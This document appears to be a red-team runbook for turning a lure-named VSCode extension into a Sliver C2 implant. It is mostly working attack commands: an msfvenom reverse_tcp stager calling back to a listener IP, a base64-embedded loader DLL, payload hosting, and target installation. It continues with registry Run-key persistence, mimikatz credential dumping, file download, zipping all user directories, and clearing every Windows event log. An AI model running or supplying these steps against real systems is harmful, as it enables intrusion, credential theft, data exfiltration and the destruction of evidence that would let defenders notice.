# VSCode Malicious Extension – Red Team Implant Documentation

## Overview
This technique deploys a malicious VSCode extension (.vsix) to execute a staged payload via PowerShell,
using Sliver C2 for command and control. Intended for authorized red team engagements only.

---

## Prerequisites

Install required Node.js tooling:

```bash
npm install -g yo generator-code @vscode/vsce
```

---

## 1. Scaffold the VSCode Extension

```bash
yo code
```

When prompted:
- **Extension type:** TypeScript (recommended)
- **Name:** Choose a convincing lure name
- **Identifier:** Match the name

---

## 2. Edit the Extension Logic

Open `src/extension.ts` and update the embedded PowerShell command to reference:
- Your `.ps1` filename
- Your C2 listener IP address

---

## 3. Compile the Extension Locally

```bash
npm install
npm run compile
```

---

## 4. Package to VSIX

```bash
vsce package
# Output: <ExtensionName>.vsix
```

---

## 5. Build the .NET Loader (Sliver DLL)

1. Open the `.NET` loader project in Visual Studio.
2. Confirm the **remote bin path** and **C2 IP** are correct in the loader config.
3. Compile the project — output is `sliverloader.dll`.

Convert the DLL to a Base64 string for embedding in the PowerShell stager:

```powershell
Get-Content -Encoding Byte -Path .\sliverloader.dll | clip
```

4. Paste the copied bytes into **CyberChef** with the following recipe:
   - `From Decimal` (Line feed delimiter)
   - `To Base64`
5. Copy the Base64 output and paste it into your `.ps1` stager script.

---

## 6. Generate the Sliver Stager Binary

Use `msfvenom` to generate a raw stager that connects back to Sliver's stage listener:

```bash
msfvenom --payload windows/x64/custom/reverse_tcp \
  LHOST=210.210.210.110 \
  LPORT=1234 \
  LURI=/hello.woff \
  --format raw \
  --out stager.bin
```

---

## 7. Configure Sliver C2

Create a new Sliver profile and start the stage listener:

```bash
profiles new --mtls 210.210.210.110 --format shellcode local

stage-listener --url tcp://210.210.210.110:443 --profile local --prepend-size

mtls
```

> **Note:** Ensure the LHOST/LPORT in `msfvenom` matches the `stage-listener` address.

---

## 8. Host the Payload Files

Serve the following files from a Python HTTP server (or equivalent):
- `stager.bin`
- `<stager>.ps1`

Confirm all callback addresses in the `.ps1` script point to the correct C2 listener.

```bash
python3 -m http.server 8080
```

---

## 9. Deploy the Extension to the Target

Transfer the `.vsix` file to the target host and install it manually via VSCode:

```
Extensions panel → ··· menu → Install from VSIX...
```

Or via CLI:

```bash
code --install-extension <ExtensionName>.vsix
```

---

## Notes & Checklist

- [ ] C2 IP is consistent across: loader, `.ps1`, `msfvenom`, and `stage-listener`
- [ ] DLL Base64 blob is correctly embedded in `.ps1`
- [ ] Python server is running and reachable from target
- [ ] Sliver stage listener is active before extension executes
- [ ] VSIX installed on target machine

## 10 Follow On Actions

Sliver: Load extensions onto target: 
```bash
#Sliver Prompt:
Armory install all --proxy http://10.10.0.100:8080

```

## 11 Priv ESC (Optional):

If UAC bypasss is required use this: 
cmstp extenion (Cargo needs to be installed)


## 12 Persitance:

Add the VSIX file to the Admins extension folder then put VSCODE on Startup

```Powershell
# $src='C:\Users\Dewey.Houston\.vscode\extensions'; $dest='C:\Users\Administrator\.vscode\extensions'; if(!(Test-Path $dest)){New-Item $dest -ItemType Directory -Force}; Copy-Item "$src\*" $dest -Recurse -Force
#Change Dewey Houston / If ran as admin just run below code
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "VSCode" -Value '"C:\Program Files\Microsoft VS Code\Code.exe"'
#Check if VSCode is on system profile
```

## 13 Follow on Actions
remove VSIX File
```Powershell
remove-item "C:\<Path to vsix File"
```
enumerate shares with sliver and run mimikatz in sliver:
```bash
sliver > sa-netuse-list
sliver > mimikatz privilege::debug
sliver >mimikatz sekurlsa::logonpasswords
# after staging download files with:
sliver > download <File_Path>
```

copy users home directory to a zip file and 
```Powershell
Compress-Archive -Path "C:\Users" -DestinationPath "C:\Windows\Temp\"
```
Clear Event View Logs

```Powershell
wevtutil el | ForEach-Object { wevtutil cl $_ }
```
